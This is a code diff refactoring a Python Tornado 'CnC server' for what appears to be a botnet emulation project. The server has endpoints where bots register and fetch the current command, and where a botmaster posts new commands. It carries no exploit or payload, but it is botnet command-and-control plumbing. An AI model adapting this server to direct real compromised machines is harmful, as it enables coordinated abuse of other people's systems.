@@ -6,23 +6,18 @@ is defined in BotCommands.py. This method will be executed by all clients that f
 All handler support plain text and json output."""
 
 import json, logging, string, sys, time, socket, os
-
+from datetime import datetime
 sys.path.append(os.path.join(os.path.dirname(__file__), os.pardir))
 import tornado.web
 from threading import Thread
 from tornado.ioloop import IOLoop
 import tornado.httpserver
 
-from AbstractBot import Runnable
+from AbstractBot import Runnable, CurrentCommandHandler
 from resources import emu_config
-from utils.MiscUtils import NetworkAddressSchema
+from utils.MiscUtils import NetworkAddressSchema, datetimeToEpoch
 
-
-def make_app():
-    """Starts the web interface that is used to interact with this server."""
-    handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CurrentCommandHandler)]
-    return tornado.web.Application(handlers, autoreload=False)
-
+_current_command = {"command": "default_command", "timestamp": datetimeToEpoch(datetime.now()), "kwargs": dict()}
 
 class BotInformation(object):
     def __init__(self, botid):
@@ -40,40 +35,19 @@ class MainHandler(tornado.web.RequestHandler):
                        "/register where clients can register themselves so we can keep track of them."
                        "/current_command where clients can retrieve commands that they should execute")
 
-class CurrentCommandHandler(tornado.web.RequestHandler):
-    """A handler that lets clients fetch the current command via HTTP GET and lets the botmaster issue a new command via
-    HTTP POST."""
 
-    current_command = {"command": "default_command", "kwargs": {}}
+# noinspection PyAbstractClass
+class CnCCommandHandler(CurrentCommandHandler):
+    """Handles HTTP GET and POST Requests for the current command for tornado"""
 
-    def get(self):
-        if "json" in string.lower(self.request.headers.get("Accept")):
-            self.set_header("Content-Type", "application/json")
-            self.write(json.dumps(self.current_command))
-        else:
-            self.set_header("Content-Type", "text/plain")
-            if not self.current_command == {}:
-                self.write(
-                    "%s: %s" % (self.current_command["command"], " ".join(self.current_command["kwargs"].values())))
+    @property
+    def current_command(self):
+        return _current_command
 
-    def post(self):
-        logging.debug('%s != %s == %s' % (self.get_body_argument("command"), self.current_command["command"],
-                                          self.get_body_argument("command") != self.current_command["command"]))
-        if self.get_body_argument("command") != self.current_command["command"]:
-            # noinspection PyBroadException
-            old_command = self.current_command
-            try:
-                self.current_command["command"] = self.get_body_argument("command")
-                self.current_command["kwargs"] = json.loads(self.get_body_argument("kwargs"))
-                logging.debug("The CnC-Server has received a new command: " % self.current_command)
-            except:
-                # rolls the change back
-                logging.warning("Command could not be applied: body_arguments = %s" % self.get_body_arguments())
-                self.current_command = old_command
-
-        self.set_header("Content-Type", "text/plain")
-        self.write("OK")
-
+    @current_command.setter
+    def current_command(self, value):
+        global _current_command
+        _current_command = value
 
 class RegisterHandler(tornado.web.RequestHandler):
     """Bots can register via HTTP POST, the number of currently known clients can be retrieved via HTTP GET"""
@@ -106,7 +80,8 @@ class CnCServer(Runnable):
         Runnable.__init__(self, **kwargs)
         self.host = host
         self.port = port
-        app = tornado.web.Application(make_app())
+        handlers = [("/", MainHandler), ("/register", RegisterHandler), ("/current_command", CnCCommandHandler)]
+        app = tornado.web.Application(handlers, autoreload=False)
         self.httpserver = tornado.httpserver.HTTPServer(app)
 
     def start(self):
